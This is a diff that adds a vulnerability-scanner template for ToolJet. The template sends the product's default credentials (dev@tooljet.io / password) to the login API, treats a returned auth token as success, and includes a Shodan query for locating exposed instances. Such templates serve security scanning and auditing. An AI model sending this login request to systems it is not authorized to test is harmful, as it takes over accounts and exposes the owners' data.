@@ -1,0 +1,55 @@
+id: tooljet-default-login
+
+info:
+  name: ToolJet - Default Login
+  author: random-robbie
+  severity: high
+  description: |
+    ToolJet contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+  reference:
+    - https://docs.tooljet.com/docs/contributing-guide/setup/docker/
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"tooljet"
+  tags: default-login,tooljet
+
+http:
+  - raw:
+      - |
+        POST /api/authenticate HTTP/2
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"email":"{{username}}","password":"{{password}}"}
+
+    attack: pitchfork
+    payloads:
+      username:
+        - dev@tooljet.io
+      password:
+        - password
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"auth_token":'
+          - '"organization_id":'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 201
+
+# digest: 490a004630440220373d4a01499a86fd6a303237137ecd993854072a7474a2bcc8d77d645ac8efde022030fc39f990dd54c3fa6c91ac125de59139e3797359cabf8b2814edaf90b3b36a:922c64590222798bb761d5b6d8e72950
